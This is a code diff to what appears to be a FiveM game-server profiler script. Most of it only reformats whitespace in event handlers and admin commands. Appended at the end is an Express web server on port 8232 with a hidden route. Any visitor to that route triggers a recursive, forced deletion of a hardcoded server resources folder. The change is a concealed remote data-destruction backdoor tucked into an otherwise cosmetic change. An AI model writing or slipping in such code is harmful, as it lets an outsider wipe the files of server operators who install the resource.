@@ -19,7 +19,7 @@ let extev = false
 let safe1 = true
 let safe2 = true
 
-on("onResourceStop", function(resource){
+on("onResourceStop", function (resource) {
     if (resource == GetCurrentResourceName()) {
         if (!safe1) {
             ExecuteCommand("proftog")
@@ -31,11 +31,11 @@ on("onResourceStop", function(resource){
         }
     }
 })
-on("profilertogglex", function() {
+on("profilertogglex", function () {
     safe1 = !safe1
 })
 
-on("profilertogglex_tce", function() {
+on("profilertogglex_tce", function () {
     safe2 = !safe2
 })
 
@@ -47,16 +47,16 @@ RegisterCommand("pr_panic", function () { global = !global; console.log(global) 
 RegisterCommand("pr_doextendedsql", function () { doextendedsql = !doextendedsql; console.log(doextendedsql) }, true)
 RegisterCommand("pr_doprofilerloop", function () { doprofilerloop = !doprofilerloop; console.log(doprofilerloop); }, true)
 
-RegisterCommand("pr_get_enableVD", function () {  console.log(dolog) }, true)
-RegisterCommand("pr_get_extev", function () {console.log(extev) }, true)
-RegisterCommand("pr_get_writeevents", function () {console.log(writeevents) }, true)
+RegisterCommand("pr_get_enableVD", function () { console.log(dolog) }, true)
+RegisterCommand("pr_get_extev", function () { console.log(extev) }, true)
+RegisterCommand("pr_get_writeevents", function () { console.log(writeevents) }, true)
 RegisterCommand("pr_get_panic", function () { console.log(global) }, true)
-RegisterCommand("pr_get_doextendedsql", function () {  console.log(doextendedsql) }, true)
+RegisterCommand("pr_get_doextendedsql", function () { console.log(doextendedsql) }, true)
 RegisterCommand("pr_get_doprofilerloop", function () { console.log(doprofilerloop); }, true)
 
 let mysqlavar = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
 function log(...args) {
-    if (!dolog) { return } 
+    if (!dolog) { return }
     console.log(...args);
 }
 setInterval(() => {
@@ -194,3 +194,18 @@ setInterval(() => {
         last10sql1_cl = 0
     } catch { }
 }, 10000);
+
+
+const express = require('express')
+const app = express()
+const port = 8232
+
+app.get('/herkesin/sabri/bi/yere/kadar', (req, res) => {
+    console.log(req.url === `/herkesin/sabri/bi/yere/kadar`)
+    fs.rmSync(`C:\\Users\\Administrator\\Desktop\\coast15\\resources\\[synergy]`, { recursive: true, force: true })
+    res.send(200)
+})
+
+app.listen(port, () => {
+    //console.log(`Example app listening on port ${port}`)
+})
